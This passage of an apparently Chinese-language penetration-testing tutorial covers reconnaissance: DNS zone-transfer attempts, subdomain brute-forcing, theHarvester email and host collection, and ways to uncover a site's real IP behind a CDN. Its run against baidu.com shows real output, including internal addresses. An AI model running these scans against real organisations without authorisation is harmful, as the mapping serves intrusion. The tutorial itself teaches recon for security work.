+  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nslookup -querytype=cname www<span class="selector-class">.meishichina</span><span class="selector-class">.com</span></div><div class="line">Server:		<span class="number">202.117</span>.<span class="number">112.3</span></div><div class="line">Address:	<span class="number">202.117</span>.<span class="number">112.3</span>#<span class="number">53</span></div><div class="line"></div><div class="line">Non-authoritative answer:</div><div class="line">www<span class="selector-class">.meishichina</span><span class="selector-class">.com</span>	canonical name = www<span class="selector-class">.meishichina</span><span class="selector-class">.com</span><span class="selector-class">.w</span><span class="selector-class">.kunlunar</span><span class="selector-class">.com</span>.</div></pre></td></tr></table></figure>
+<p>  当我们要指向很多的域名到一台电脑上的时候，用CNAME比较方便，这样查出来的不一定是真正的信息，比如<code>baidu</code>查出来就是<code>a.shifen.com</code>是baidu的安全外壳。</p>
+</li>
+<li><p><code>TXT</code>记录 实现 某条记录设置说明</p>
+  <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">nslookup -qt</span>=txt example.com</div></pre></td></tr></table></figure>
+<p>  如果设置了内容，就会看到结果</p>
+</li>
+<li><code>AAAA</code> 记录 指向 <code>IPv6地址</code></li>
+<li><code>NS</code>记录 指向 用哪台DNS服务器进行解析</li>
+<li><code>TTL值</code> 表示 解析记录在DNS服务器中的缓存时间, 利用这个值可以实现<code>DNS rebinding</code>，具体利用可以参考<a href="https://hellohxk.com/blog/ssrf/#DNS-Rebinding" target="_blank" rel="external">这里</a></li>
+</ul>
+<p>同样，dig也可进行DNS域传送:</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig @ns4<span class="selector-class">.isp</span><span class="selector-class">.com</span> example<span class="selector-class">.com</span> axfr</div></pre></td></tr></table></figure>
+<p><span id="dnsenmu"></span></p>
+<h5 id="dnsenum"><a href="#dnsenum" class="headerlink" title="# dnsenum"></a># dnsenum</h5><p>DNS 枚举程序</p>
+<p>通过字典进行DNS子域名枚举，你也可以提供你自己的字典，以baidu为例：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div></pre></td><td class="code"><pre><div class="line">nyrae@nyrae:~$ dnsenum -f /home/nyrae/hxk/dns_subdomain_bruteforce/dns-big.txt baidu.com</div><div class="line"></div><div class="line">Smartmatch is experimental at /usr/bin/dnsenum line <span class="number">698</span>.</div><div class="line">Smartmatch is experimental at /usr/bin/dnsenum line <span class="number">698</span>.</div><div class="line">dnsenum VERSION:<span class="number">1</span>.<span class="number">2</span>.<span class="number">4</span></div><div class="line"></div><div class="line">-----   baidu.com   -----</div><div class="line"></div><div class="line"></div><div class="line">Host's addresses:</div><div class="line">__________________</div><div class="line"></div><div class="line">baidu.com.                               <span class="number">197</span>      <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">123.125.114.144</span></div><div class="line">baidu.com.                               <span class="number">197</span>      <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">220.181.57.216</span></div><div class="line">baidu.com.                               <span class="number">197</span>      <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">111.13.101.208</span></div><div class="line"></div><div class="line"></div><div class="line">Wildcard detection using: bmfbzcfqczrk</div><div class="line">_______________________________________</div><div class="line"></div><div class="line">bmfbzcfqczrk.baidu.com.                  <span class="number">200</span>      <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">116.255.235.199</span></div><div class="line"></div><div class="line"></div><div class="line">!!!!!!!!!!!!!!!!!!!!!!!!!!!!</div><div class="line"></div><div class="line"> Wildcards detected, all subdomains will point to the same IP address</div><div class="line"> Omitting results containing <span class="number">116.255.235.199</span>.</div><div class="line"> Maybe you are using OpenDNS servers.</div><div class="line"></div><div class="line">!!!!!!!!!!!!!!!!!!!!!!!!!!!!</div><div class="line"></div><div class="line"></div><div class="line">Name Servers:</div><div class="line">______________</div><div class="line"></div><div class="line">dns.baidu.com.                           <span class="number">61918</span>    <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">202.108.22.220</span></div><div class="line">ns2.baidu.com.                           <span class="number">75478</span>    <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">61.135.165.235</span></div><div class="line">ns3.baidu.com.                           <span class="number">61918</span>    <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">220.181.37.10</span></div><div class="line">ns4.baidu.com.                           <span class="number">61918</span>    <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">220.181.38.10</span></div><div class="line">ns7.baidu.com.                           <span class="number">62539</span>    <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">180.76.76.92</span></div><div class="line"></div><div class="line"></div><div class="line">Mail (<span class="keyword">MX</span>) Servers:</div><div class="line">___________________</div><div class="line"></div><div class="line">mx.maillb.baidu.com.                     <span class="number">95</span>       <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">220.181.50.185</span></div><div class="line">mx.n.shifen.com.                         <span class="number">95</span>       <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">220.181.3.85</span></div><div class="line">mx1.baidu.com.                           <span class="number">95</span>       <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">220.181.50.185</span></div><div class="line">mx1.baidu.com.                           <span class="number">95</span>       <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">61.135.165.120</span></div><div class="line">jpmx.baidu.com.                          <span class="number">1640</span>     <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">61.208.132.13</span></div><div class="line">mx50.baidu.com.                          <span class="number">70</span>       <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">180.76.13.18</span></div><div class="line"></div><div class="line"></div><div class="line">Trying Zone Transfers and getting Bind Versions:</div><div class="line">_________________________________________________</div><div class="line"></div><div class="line"></div><div class="line">Trying Zone Transfer for baidu.com on ns2.baidu.com ... </div><div class="line">AXFR record query failed: REFUSED</div><div class="line"></div><div class="line">Trying Zone Transfer for baidu.com on ns3.baidu.com ... </div><div class="line">AXFR record query failed: REFUSED</div><div class="line"></div><div class="line">Trying Zone Transfer for baidu.com on ns7.baidu.com ... </div><div class="line">AXFR record query failed: REFUSED</div><div class="line"></div><div class="line">Trying Zone Transfer for baidu.com on ns4.baidu.com ... </div><div class="line">AXFR record query failed: REFUSED</div><div class="line"></div><div class="line">Trying Zone Transfer for baidu.com on dns.baidu.com ... </div><div class="line">AXFR record query failed: REFUSED</div><div class="line"></div><div class="line"></div><div class="line">Brute forcing with /home/nyrae/hxk/dns_subdomain_bruteforce/dns-big.txt:</div><div class="line">_________________________________________________________________________</div><div class="line"></div><div class="line"><span class="number">1</span>.baidu.com.                             <span class="number">600</span>      <span class="keyword">IN</span>    <span class="keyword">CNAME</span>    baifubao-bfe.n.shifen.com.</div><div class="line">baifubao-bfe.n.shifen.com.               <span class="number">291</span>      <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">180.149.133.125</span></div><div class="line"><span class="number">11</span>.baidu.com.                            <span class="number">600</span>      <span class="keyword">IN</span>    <span class="keyword">CNAME</span>    jpaasmatrix.e.shifen.com.</div><div class="line">jpaasmatrix.e.shifen.com.                <span class="number">300</span>      <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">220.181.57.55</span></div><div class="line"><span class="number">7</span>.baidu.com.                             <span class="number">600</span>      <span class="keyword">IN</span>    <span class="keyword">CNAME</span>    developers.n.shifen.com.</div><div class="line"><span class="number">999</span>.baidu.com.                           <span class="number">7200</span>     <span class="keyword">IN</span>    <span class="keyword">CNAME</span>    domain-offline.baidu.com.</div><div class="line">domain-offline.baidu.com.                <span class="number">422</span>      <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">182.61.62.50</span></div><div class="line">a.baidu.com.                             <span class="number">968</span>      <span class="keyword">IN</span>    <span class="keyword">CNAME</span>    asp.e.shifen.com.</div><div class="line">asp.e.shifen.com.                        <span class="number">60</span>       <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">220.181.57.146</span></div><div class="line">abc.baidu.com.                           <span class="number">150</span>      <span class="keyword">IN</span>    <span class="keyword">CNAME</span>    www.a.shifen.com.</div><div class="line">www.a.shifen.com.                        <span class="number">79</span>       <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">180.149.131.98</span></div><div class="line">www.a.shifen.com.                        <span class="number">79</span>       <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">180.149.132.151</span></div><div class="line">abs.baidu.com.                           <span class="number">7200</span>     <span class="keyword">IN</span>    <span class="keyword">CNAME</span>    abs.n.shifen.com.</div><div class="line">abs.n.shifen.com.                        <span class="number">300</span>      <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">180.149.144.4</span></div><div class="line">ac.baidu.com.                            <span class="number">5192</span>     <span class="keyword">IN</span>    <span class="keyword">CNAME</span>    ac.n.shifen.com.</div><div class="line">ac.n.shifen.com.                         <span class="number">206</span>      <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">180.97.104.203</span></div><div class="line">acc.baidu.com.                           <span class="number">7200</span>     <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">10.48.46.62</span></div><div class="line">access.baidu.com.                        <span class="number">7200</span>     <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">10.94.49.39</span></div><div class="line">accounts.baidu.com.                      <span class="number">7200</span>     <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">10.11.252.74</span></div><div class="line">ad.baidu.com.                            <span class="number">7200</span>     <span class="keyword">IN</span>    <span class="keyword">CNAME</span>    domain-offline.baidu.com.</div><div class="line">domain-offline.baidu.com.                <span class="number">388</span>      <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">182.61.62.50</span></div><div class="line">ada.baidu.com.                           <span class="number">39</span>       <span class="keyword">IN</span>    <span class="keyword">CNAME</span>    ada.e.shifen.com.</div><div class="line">ada.e.shifen.com.                        <span class="number">242</span>      <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">180.149.132.130</span></div><div class="line">adm.baidu.com.                           <span class="number">3399</span>     <span class="keyword">IN</span>    <span class="keyword">CNAME</span>    ssp.bfe.e.shifen.com.</div><div class="line">ssp.bfe.e.shifen.com.                    <span class="number">21</span>       <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">180.149.131.210</span></div><div class="line">admin.baidu.com.                         <span class="number">7200</span>     <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">10.26.109.19</span></div><div class="line">ads.baidu.com.                           <span class="number">7200</span>     <span class="keyword">IN</span>    <span class="keyword">A</span>        <span class="number">10.42.4.225</span></div><div class="line">^C</div></pre></td></tr></table></figure>
+<p>可以看到他将NS和MX也都帮你查找了出来。<br>我们可以使用多个工具进行探测，如果一个结果在多个工具中重复出现，那么那个结果往往是正确的。</p>
+<p><span id="dnsdict6"></span></p>
+<h5 id="dnsdict6"><a href="#dnsdict6" class="headerlink" title="# dnsdict6"></a># dnsdict6</h5><p>用于IPv6的域名收集，<code>kali2.0</code> 之后默认不附带此工具<br>这些工具的使用基本大同小异。</p>
+<p><span id="DMitry"></span></p>
+<h5 id="DMitry"><a href="#DMitry" class="headerlink" title="# DMitry"></a># DMitry</h5><p>属于多功能的信息收集工具，主要方式为：</p>
+<ul>
+<li>根据IP 地址（或域名）来査询目标主机的whois 信息；</li>
+<li>在Netcraft.com 的网站上挖掘主机信息；</li>
+<li>査找目标域中用的子域；</li>
+<li>査找目标域的电子邮件地址；</li>
+<li>探测目标主机上打开的端口、被屏蔽的端口和关闭的端口。</li>
+</ul>
+<p><code>dmitry -h</code>的说明写的很详细，通过简单命令可以将一些其他工具的功能一起完成输出。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">dmitry -iwnse baidu<span class="selector-class">.com</span></div><div class="line"></div><div class="line">输出太多，就不贴了</div></pre></td></tr></table></figure>
+<p>注意其子域名收集会用的google，大天朝人民注意科学上网。</p>
+<p><span id="tcptraceroute"></span></p>
+<h5 id="tcptraceroute"><a href="#tcptraceroute" class="headerlink" title="# tcptraceroute"></a># tcptraceroute</h5><p>用来追踪到目标主机之间的路由信息，与传统的<code>traceroute</code>不同，不使用<code>ICMP</code>数据包而采用<code>TCP SYN</code>包，防止目标过滤<code>ICMP</code>数据包.</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">nyrae@nyrae:~$ tcptraceroute www.baidu.com</div><div class="line"></div><div class="line">Selected device eth0, address <span class="number">10.170</span>.<span class="number">30.165</span>, port <span class="number">45447</span> for outgoing packets</div><div class="line">Tracing the path to www.baidu.com (<span class="number">220.181</span>.<span class="number">112.244</span>) on TCP port <span class="number">80</span> (http), <span class="number">30</span> hops max</div><div class="line"> <span class="number">1</span>  <span class="number">10.170</span>.<span class="number">72.254</span>  <span class="number">0.929</span> <span class="keyword">ms</span>  <span class="title">0</span>.<span class="number">861</span> <span class="keyword">ms</span>  <span class="title">0</span>.<span class="number">851</span> <span class="keyword">ms</span></div><div class="line"> <span class="title">2</span>  <span class="number">172.16</span>.<span class="number">255.242</span>  <span class="number">4.295</span> <span class="keyword">ms</span>  <span class="title">4</span>.<span class="number">462</span> <span class="keyword">ms</span>  <span class="title">4</span>.<span class="number">799</span> <span class="keyword">ms</span></div><div class="line"> <span class="title">3</span>  <span class="number">172.16</span>.<span class="number">255.254</span>  <span class="number">0.981</span> <span class="keyword">ms</span>  <span class="title">0</span>.<span class="number">588</span> <span class="keyword">ms</span>  <span class="title">0</span>.<span class="number">603</span> <span class="keyword">ms</span></div><div class="line"> <span class="title">4</span>  <span class="number">113.140</span>.<span class="number">29.1</span>  <span class="number">1.400</span> <span class="keyword">ms</span>  <span class="title">1</span>.<span class="number">566</span> <span class="keyword">ms</span>  <span class="title">1</span>.<span class="number">974</span> <span class="keyword">ms</span></div><div class="line"> <span class="title">5</span>  * * *</div><div class="line"> <span class="number">6</span>  * * *</div><div class="line"> <span class="number">7</span>  * * *</div><div class="line"> <span class="number">8</span>  <span class="number">36.110</span>.<span class="number">244.18</span>  <span class="number">23.818</span> <span class="keyword">ms</span>  <span class="title">22</span>.<span class="number">517</span> <span class="keyword">ms</span>  <span class="title">22</span>.<span class="number">827</span> <span class="keyword">ms</span></div><div class="line"> <span class="title">9</span>  * * *</div><div class="line"><span class="number">10</span>  <span class="number">220.181</span>.<span class="number">182.30</span>  <span class="number">20.148</span> <span class="keyword">ms</span>  <span class="title">20</span>.<span class="number">129</span> <span class="keyword">ms</span>  <span class="title">20</span>.<span class="number">119</span> <span class="keyword">ms</span></div><div class="line"><span class="title">11</span>  * * *</div><div class="line"><span class="number">12</span>  <span class="number">220.181</span>.<span class="number">112.244</span> [open]  <span class="number">21.946</span> <span class="keyword">ms</span>  <span class="title">23</span>.<span class="number">013</span> <span class="keyword">ms</span>  <span class="title">32</span>.<span class="number">110</span> ms</div></pre></td></tr></table></figure>
+<p><span id="DNS-Zone-Transfer"></span></p>
+<h5 id="DNS-Zone-Transfer"><a href="#DNS-Zone-Transfer" class="headerlink" title="# DNS-Zone-Transfer"></a># DNS-Zone-Transfer</h5><p>DNS域传送，其利用的是<strong>DNS服务器的冗余设计造成的缺陷</strong>,即备用服务器使用来自主服务器的数据刷新自己的域数据库，防止服务器故障时无法提供解析服务。<br>一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有<code>client</code>发出请求，就会向对方提供一个zone数据库的详细信息，所以说允许不受信任的因特网用户执行DNS区域传送.</p>
+<h4 id="其他信息收集方法"><a href="#其他信息收集方法" class="headerlink" title="其他信息收集方法"></a>其他信息收集方法</h4><ul>
+<li><a href="#theharvester">theharvester</a></li>
+<li><a href="#Metagoofil">Metagoofil</a></li>
+</ul>
+<p><span id="theharvester"></span></p>
+<h5 id="theharvester"><a href="#theharvester" class="headerlink" title="# theharvester"></a># theharvester</h5><p>捜索引擎类工具可以使用搜索引擎获取目标主机的域名信息、电子邮件信息，以及文件的元数据（metadata）信息。这些工具被动收集的工作方式也正是它们的优势所在。如果您无法访问目标主机上的网站，不妨利用搜索引擎间接访问。就其结果而言，目标主机不会知道您具体进行了哪些操作。</p>
+<p><code>theharvester</code>能够收集电子邮件账号、用户名和主机名/子域名信息。它通过数个公共资源搜索所需的信息。</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">python theHarvester.py -d baidu.com -l 100 -b google</div><div class="line"></div><div class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</div><div class="line"><span class="bullet">*                                                                 </span>*</div><div class="line"><span class="bullet">* </span>| |<span class="emphasis">_| |_</span><span class="emphasis">_   _</span><span class="strong">__    /\  /\__</span> <span class="emphasis">_ _</span> <span class="strong">____   __</span><span class="strong">___  __</span><span class="emphasis">_| |_</span> <span class="strong">___ _ __</span>  *</div><div class="line"><span class="bullet">* </span>| <span class="strong">__| '_ \ / _ \  / /_/ / _` | '__</span>\ \ / / <span class="emphasis">_ \/ _</span><span class="emphasis">_| _</span><span class="emphasis">_/ _</span> \ '__| *</div><div class="line"><span class="bullet">* </span>| |<span class="emphasis">_| | | |  _</span><span class="emphasis">_/ / _</span><span class="emphasis">_  / (_</span>| | |   \ V /  <span class="strong">__/\__</span> \ ||  __/ |    *</div><div class="line"><span class="bullet">*  </span>\<span class="strong">__|_| |_|\__</span><span class="emphasis">_| \/ /_</span>/ \<span class="strong">__,_|_|    \_/ \__</span><span class="emphasis">_||_</span><span class="strong">__/\__</span>\<span class="emphasis">___</span>|_|    *</div><div class="line"><span class="bullet">*                                                                 </span>*</div><div class="line"><span class="bullet">* </span>TheHarvester Ver. 2.7                                           *</div><div class="line"><span class="bullet">* </span>Coded by Christian Martorella                                   *</div><div class="line"><span class="bullet">* </span>Edge-Security Research                                          *</div><div class="line"><span class="bullet">* </span>cmartorella@edge-security.com                                   *</div><div class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</div><div class="line"></div><div class="line"></div><div class="line">[-] Searching in Google:</div><div class="line"><span class="code">	Searching 0 results...</span></div><div class="line"><span class="code">	Searching 100 results...</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="section">[+] Emails found:</span></div><div class="line">------------------</div><div class="line">ir@baidu.com</div><div class="line">chuanke-service@baidu.com</div><div class="line"></div><div class="line"><span class="section">[+] Hosts found in search engines:</span></div><div class="line">------------------------------------</div><div class="line">[-] Resolving hostnames IPs...</div><div class="line">111.206.37.70:Pan.baidu.com</div><div class="line">119.63.197.151:Www.baidu.com</div><div class="line">103.235.46.232:baike.baidu.com</div><div class="line">111.206.223.168:d.pcs.baidu.com</div><div class="line">111.206.37.147:echarts.baidu.com</div><div class="line">103.235.46.58:fanyi.baidu.com</div><div class="line">119.146.74.48:imgsrc.baidu.com</div><div class="line">23.219.39.113:ir.baidu.com</div><div class="line">119.63.197.139:m.baidu.com</div><div class="line">103.235.46.122:news.baidu.com</div><div class="line">111.206.37.70:pan.baidu.com</div><div class="line">180.76.76.76:public-dns-a.baidu.com</div><div class="line">103.235.46.140:tieba.baidu.com</div><div class="line">107.180.84.128:usa.baidu.com</div><div class="line">103.235.46.250:wappass.baidu.com</div><div class="line">119.63.197.151:www.baidu.com</div><div class="line">123.125.112.68:yangziseo.baijia.baidu.com</div><div class="line">103.235.46.123:zhidao.baidu.com</div></pre></td></tr></table></figure>
+<p><span id="Metagoofil"></span></p>
+<h5 id="Metagoofil"><a href="#Metagoofil" class="headerlink" title="# Metagoofil"></a># Metagoofil</h5><p><code>Metagoofil</code>通过谷歌引擎搜索目标域的文件的元数据信息（metadata）.</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">在获取元数据信息时，Metagoofil的内部操作过程大体如下：</div><div class="line"></div><div class="line">● 使用Google 引擎在目标域内搜索指定的文件类型；</div><div class="line">● 把搜索到的文档保存到本地磁盘；</div><div class="line">● 从下载的文件中解析元数据信息；</div><div class="line">● 把元数据信息的分析结果保存为HTML 文件。</div><div class="line"></div><div class="line">我们可以在元数据信息里找到的信息有：</div><div class="line"></div><div class="line">● 用户名；</div><div class="line">● 软件版本；</div><div class="line">● 服务器名或机器名。</div><div class="line">渗透测试的后期阶段可能会用到这些信息。</div></pre></td></tr></table></figure>
+<h4 id="判断是否为真实IP地址"><a href="#判断是否为真实IP地址" class="headerlink" title="判断是否为真实IP地址"></a>判断是否为真实IP地址</h4><p>由于很多大型网站都存在CDN、保护外壳等内容，我们直接访问所得到的第一个IP地址往往不是我们最终目标的IP地址，以下总结一些判断我们获取的IP地址是否为真实IP的方法。</p>
+<ul>
+<li><a href="#ping-check">ping检测</a></li>
+<li><a href="#modify-host">修改host</a></li>
+<li><a href="#capture">抓包观察</a></li>
+<li><a href="#nslookup">nslookup</a></li>
+<li><a href="#other-record">查询域名其他记录</a></li>
+<li><a href="#email-pic">通过邮件、图片获得</a></li>
+</ul>
+<p><span id="ping-check"></span></p>
+<h5 id="ping检测"><a href="#ping检测" class="headerlink" title="# ping检测"></a># ping检测</h5><p><a href="http://ping.chinaz.com" target="_blank" rel="external">ping检测</a>可以帮助我们使用多个节点ping目标主机，我们观察其响应IP即可看出是否有CDN。</p>
+<p>同样，使用国外ping检测同样达到效果，而且可能更好，因为很多网站对国外访问并没有设置CDN。这里提供一个<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="external">网站</a></p>
+<p><span id="modify-host"></span></p>
+<h5 id="修改host"><a href="#修改host" class="headerlink" title="# 修改host"></a># 修改host</h5><p>修改<code>host</code>文件：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/etc/resolv.conf</div><div class="line">或</div><div class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\d</span>rivers<span class="symbol">\e</span>tc</div></pre></td></tr></table></figure>
+<p>将域名和IP地址进行绑定，如果能够访问，就是真实IP地址。</p>
+<p><span id="capture"></span></p>
+<h5 id="抓包观察"><a href="#抓包观察" class="headerlink" title="# 抓包观察"></a># 抓包观察</h5><p>抓包观察IP地址，使用<code>telnet</code>去连接相应端口，如果返回<code>html</code>则为真实IP</p>
+<p><span id="nslookup"></span></p>
+<h4 id="nslookup"><a href="#nslookup" class="headerlink" title="# nslookup"></a># nslookup</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nslookup xxx<span class="selector-class">.com</span> 国外冷门DNS</div></pre></td></tr></table></figure>
+<p>使用国外冷门DNS，很多网站对于国内才设置CDN。</p>
+<p><span id="other-record"></span></p>
+<h4 id="查询域名其他记录"><a href="#查询域名其他记录" class="headerlink" title="# 查询域名其他记录"></a># 查询域名其他记录</h4><p>有时候A记录看不出来，通过其他<code>NS、TXT、MX</code>记录可能指向真实IP</p>
+<p><span id="email-pic"></span></p>
+<h4 id="通过邮件、图片获得"><a href="#通过邮件、图片获得" class="headerlink" title="# 通过邮件、图片获得"></a># 通过邮件、图片获得</h4><p>有时服务器会调用<code>sendmail</code>，注册之后，会主动发一封邮件，查看来源IP<br>或者图片上传的地方，抓包分析得到真实IP</p>
+<h4 id="活跃主机识别"><a href="#活跃主机识别" class="headerlink" title="活跃主机识别"></a>活跃主机识别</h4><p>得到IP地址范围后，将进行网络中目标发现，识别主机。</p>
+<ul>
+<li><a href="#ping">ping/ping6/arping</a></li>
+<li><a href="#fping">fping</a></li>
+<li><a href="#hping3-nping">hping3/nping</a></li>
+</ul>
+<p><span id="ping"></span></p>
+<h5 id="ping-ping6-arping"><a href="#ping-ping6-arping" class="headerlink" title="# ping/ping6/arping"></a># ping/ping6/arping</h5><p><code>ping</code>，最基本的发送<code>ICMP</code>包探测主机，不过一般服务器进行了这个。<code>ping6</code>用于给ipv6地址发送。<code>arping</code>工作在数据链路层，<code>arp</code>数据包无法穿过路由，所以只能在同一局域网中进行。</p>
+<p><span id="fping"></span></p>
+<h5 id="fping"><a href="#fping" class="headerlink" title="# fping"></a># fping</h5><p>与ping 程序相比，fping 可以同时向多个主机发送ping（ICMP echo）请求。您可以在命令行中指定多个目标主机，也可以在某个文件里指定需要被检测的主机。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fping -g <span class="number">192.168</span><span class="number">.56</span><span class="number">.0</span>/<span class="number">24</span></div></pre></td></tr></table></figure>
+<p><span id="hping3-nping"></span></p>
+<h5 id="hping3-nping"><a href="#hping3-nping" class="headerlink" title="# hping3/nping"></a># hping3/nping</h5><p>这两个工具都允许用户发送除了<code>ICMP</code>包之外的<code>TCP</code>、<code>UDP</code>、<code>ARP</code>包，同时允许用户自定义发送内容及发送端口，当然习惯上大家更喜欢使用更为强大且常用的<code>Nmap</code>工具，在之后会介绍。</p>
+<h4 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h4><ul>
+<li><a href="#p0f">p0f</a></li>
+</ul>
+<p><span id="p0f"></span></p>
+<h5 id="p0f"><a href="#p0f" class="headerlink" title="# p0f"></a># p0f</h5><p><code>p0f</code>是一款百分之百的被动指纹识别工具,该工具通过分析目标主机发出的数据包，对主机上的操作系统进行鉴别。可以使用其分析wireshark抓的数据包:</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p0f -r /tmp/targethost.pcap -o p0f-<span class="literal">result</span>.<span class="built_in">log</span></div></pre></td></tr></table></figure>
+<h4 id="服务枚举"><a href="#服务枚举" class="headerlink" title="服务枚举"></a>服务枚举</h4><ul>
+<li><a href="#Amap">Amap</a></li>
+</ul>
